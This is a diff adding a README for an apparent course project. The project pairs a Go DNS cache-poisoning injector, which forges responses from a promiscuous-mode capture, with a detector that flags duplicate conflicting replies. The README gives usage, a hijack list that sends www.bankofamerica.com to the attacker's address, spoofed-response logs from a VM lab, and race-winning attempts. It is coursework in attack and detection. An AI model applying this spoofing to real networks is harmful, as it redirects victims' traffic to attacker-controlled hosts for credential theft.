@@ -1,0 +1,168 @@
+# DNS-Poisoning-and-DNS-Poison-Detecting
+
+Part 1: An on-path DNS poisoning attack tool - dns_poison.go
+
+dns_poison.go
+
+- A DNS packet injector
+- captures the traffic from a network interface in promiscuous mode, and injects forged
+responses to selected DNS requests with the goal of poisoning the cache of the victim's resolver.
+
+Arguments supported :
+
+go run dns_poison.go [-i interface] [-f hostnames] [expression]
+
+-i Listen on network device <interface> (e.g., eth0). If not specified, dns_poison will select a default interface to listen on. The same interface will be used for packet injection.
+-f Reads a list of IP address and hostname pairs specifying the hostnames to be hijacked. If '-f' is not specified, dns_poison forges replies to
+all observed requests with the chosen interface's IP address as an answer.
+  
+The optional <expression> argument is a BPF filter that specifies a subset of the traffic to be monitored.
+  
+The <hostnames> file “poisonhosts” contains one IP and hostname pair per line, separated by whitespace in the following format:
+192.168.154.129 www.bankofamerica.com 192.168.154.129 *.tcpdump.org* 192.168.154.129 *.cs.stonybrook.edu 192.168.154.129 www.tcpdump.com
+
+Strategy followed:
+
+- Required packages were imported and global variables were declared.
+    
+ - In interface_IP function, we are getting the list of interfaces,looping through them to get our local address
+-In Packet_Spoof function, creating the decoder for fast-packet decoding and checking hostname pairs.
+-In spoofResponse function, pre-creating the response with most of the data filled out,creating a buffer for writing output packet,setting the arguments for serialization,getting the question,verifying that it is a A_IN record question,copying name across to the response,appending the answer to original query packet,swapping ethernet macs,ip,udp ports,checking the udp to be checksummed by the IP Layer,serializing packets and printing spoofed response
+
+Part 2: A passive DNS poisoning attack detector - dns_detect.go
+
+dns_detect.go
+
+- A DNS packet injector
+- captures the traffic from a network interface in promiscuous mode and detects
+DNS poisoning attack attempts.
+- Detection is based on identifying duplicate responses within a short time interval towards
+the same destination, which contain different answers for the same request. 
+
+Arguments supported :
+
+go run dns_detect.go [-i interface] [-r tracefile] expression
+-i Listen on network device <interface> (e.g., eth0). If not specified, the program will select a default interface to listen on.
+-r Read packets from <tracefile> (tcpdump format). Useful for detecting DNS poisoning attacks in existing network traces.
+  
+<expression> is a BPF filter that specifies a subset of the traffic to be monitored.
+  
+Strategy followed:
+
+Going through packets one by one, checking the DNS Layer of the packet, checking the Transaction id that matches and printing it.
+
+Implementation:
+
+Considered:
+Attacker - Ubuntu VM Victim - Windows OS VM
+   
+Results obtained:
+ 
+1)Executing dns_poison.go without any interface or pcap file specification - reads from poisonhosts.
+
+Command : sudo go run dns_poison.go -f poisonhosts 
+Output :
+Reading from interface ens33
+Retrieving replies from all DNS requests with these hosts map[*.cs.stonybrook.edu:192.168.154.129 *.tcpdump.org*:192.168.154.129 www.bankofamerica.com:192.168.154.129 www.tcpdump.com:192.168.154.129] Reading from interface ens33
+Spoofed Response: IP 8.8.8.8:53(domain) > 192.168.154.129:60288 52984 www.tcpdump.org 
+
+Command : sudo go run dns_detect.go
+Output :
+Reading from interface ens33
+DNS Poisoning Attempt for id 52984 and domain www.tcpdump.org 
+Answer (1) : 159.89.89.188
+Answer (2) : 192.168.154.155
+
+2) With interface specified
+
+Command : sudo go run dns_poison.go -i ens33 -f poisonhosts
+Output:
+Reading from interface ens33
+Retrieving replies from all DNS requests with these hosts map[*.cs.stonybrook.edu:192.168.154.129 *.tcpdump.org*:192.168.154.129 www.bankofamerica.com:192.168.154.129 www.tcpdump.com:192.168.154.129] Reading from interface ens33
+Spoofed Response: IP 8.8.8.8:53(domain) > 192.168.154.129:54746 33803
+www.bankofamerica.com
+
+Command : sudo go run dns_detect.go 
+Output:
+Reading from interface ens33
+DNS Poisoning Attempt for id 33803 and domain www.bankofamerica.com 
+Answer (1) : 171.159.116.100
+Answer (2) : 192.168.154.155
+  
+ 3)To Obtain packets with pcap file specified
+
+- Creating a pcap file: 
+
+Command:
+sudo tcpdump -n udp and port 53 -w myfile.pcap
+Output:
+tcpdump: listening on ens33, link-type EN10MB (Ethernet), capture size 262144 bytes ^C179 packets captured
+179 packets received by filter
+0 packets dropped by kernel
+
+Command:
+sudo go run dns_poison.go -f poisonhosts
+Output:
+Reading from interface ens33
+Retrieving replies from all DNS requests with these hosts map[*.cs.stonybrook.edu:192.168.154.129 *.tcpdump.org*:192.168.154.129 www.bankofamerica.com:192.168.154.129 www.tcpdump.com:192.168.154.129] Only capturing packets with filter udp port 53
+Reading from interface ens33
+Spoofed Response: IP 8.8.8.8:53(domain) > 192.168.154.129:56181 35013 www.bankofamerica.com
+Spoofed Response: IP 8.8.8.8:53(domain) > 192.168.154.129:50556 40023 www.cs.stonybrook.edu
+Spoofed Response: IP 8.8.8.8:53(domain) > 192.168.154.129:54757 41461
+www.tcpdump.org
+
+Command : sudo go run dns_detect.go -r hw3file.pcap
+Output:
+DNS Poisoning Attempt for id 35013 and domain www.bankofamerica.com 
+Answer (1) : 171.159.116.100
+Answer (2) : 192.168.154.155
+DNS Poisoning Attempt for id 40023 and domain www.cs.stonybrook.edu 
+Answer (1) : 23.185.0.2
+Answer (2) : 192.168.154.155
+DNS Poisoning Attempt for id 41461 and domain www.tcpdump.org 
+Answer (1) : 159.89.89.188
+Answer (2) : 192.168.154.155
+
+4)Without specifying poisonhosts file
+ 
+Command : sudo go run dns_poison.go
+Output:
+Reading from interface ens33 Retrieving replies from all DNS requests map[:������]
+Reading from interface ens33
+Spoofed Response: IP 192.168.154.2:53(domain) > 192.168.154.155:47610 13487 play.google.com
+Spoofed Response: IP 192.168.154.2:53(domain) > 192.168.154.155:47610 6324 play.google.com
+Spoofed Response: IP 192.168.154.2:53(domain) > 192.168.154.155:43127 32298 play.google.com
+Spoofed Response: IP 192.168.154.2:53(domain) > 192.168.154.155:43127 3633 play.google.com
+Spoofed Response: IP 192.168.154.2:53(domain) > 192.168.154.155:36087 6308 play.google.com
+Spoofed Response: IP 192.168.154.2:53(domain) > 192.168.154.155:36087 8360 play.google.com
+Spoofed Response: IP 192.168.154.2:53(domain) > 192.168.154.155:47223 1134 play.google.com
+Spoofed Response: IP 192.168.154.2:53(domain) > 192.168.154.155:47223 23154 play.google.com
+Spoofed Response: IP 192.168.154.2:53(domain) > 192.168.154.155:52679 22318 play.google.com
+Spoofed Response: IP 192.168.154.2:53(domain) > 192.168.154.155:52679 15667 play.google.com
+Spoofed Response: IP 192.168.154.2:53(domain) > 192.168.154.155:49147 15919 chat.google.com
+Spoofed Response: IP 192.168.154.2:53(domain) > 192.168.154.155:49147 2107 chat.google.com
+Spoofed Response: IP 192.168.154.2:53(domain) > 192.168.154.155:43936 56832 chat.google.com
+Spoofed Response: IP 192.168.154.2:53(domain) > 192.168.154.155:43936 58371 chat.google.com
+Spoofed Response: IP 192.168.154.2:53(domain) > 192.168.154.155:49550 13481 play.google.com
+Spoofed Response: IP 192.168.154.2:53(domain) > 192.168.154.155:49550 41646 play.google.com
+Spoofed Response: IP 192.168.154.2:53(domain) > 192.168.154.155:37873 15381 play.google.com
+Spoofed Response: IP 192.168.154.2:53(domain) > 192.168.154.155:37873 543 play.google.com
+Spoofed Response: IP 192.168.154.2:53(domain) > 192.168.154.155:48360 32888 play.google.com
+^Csignal: interrupt
+
+5)With filter expression specified.
+Command :
+sudo go run dns_poison.go -r hw3file.pcap -f poisonhosts "not udp"
+
+Output:
+Retrieving replies from all DNS requests with these hosts map[*.cs.stonybrook.edu:192.168.154.129 *.tcpdump.org*:192.168.154.129 www.bankofamerica.com:192.168.154.129 www.tcpdump.com:192.168.154.129] 2021/04/12 20:56:48 expression rejects all packets
+exit status 1
+Insight : rejects all packets since there isn’t any expression as “not udp” in the packets to filter them which implies that the filter expression is working.
+
+To win the race: 
+Attempts:
+- Disabling DoH/DoT, if it is enabled in the victim's browser - was using Mozilla Firefox anyway, so this wasn’t needed to be done.
+- Picked and tried various servers that were "far away", like
+1.1.1.1
+9.9.9.9 209.244.0.3 77.88.8.8 198.101.242.72 91.239.100.100
+But failed to win the race.
